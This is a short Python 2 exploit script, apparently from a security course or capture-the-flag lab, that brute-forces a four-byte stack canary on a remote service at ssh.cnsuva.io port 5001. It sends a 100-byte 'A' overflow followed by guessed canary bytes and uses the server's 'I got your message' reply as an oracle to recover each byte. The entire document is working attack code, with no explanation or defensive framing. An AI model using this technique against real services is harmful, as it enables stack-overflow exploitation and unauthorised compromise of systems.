from socket import socket
from sys import stdout

canary = list()

while True:
    print '\r' + ''.join([hex(b)[2:].rjust(2, '0') for b in (canary + [0]*4)[3::-1]]),
    stdout.flush()

    s = socket()
    s.connect(('ssh.cnsuva.io', 5001))

    s.send('A'*100 + ''.join([chr(b) for b in canary]))

    if s.recv(100) == 'I got your message\n':
        if len(canary) == 4:
            s.close()
            break
        canary.append(0)

    else:
        canary[-1] += 1

    s.close()
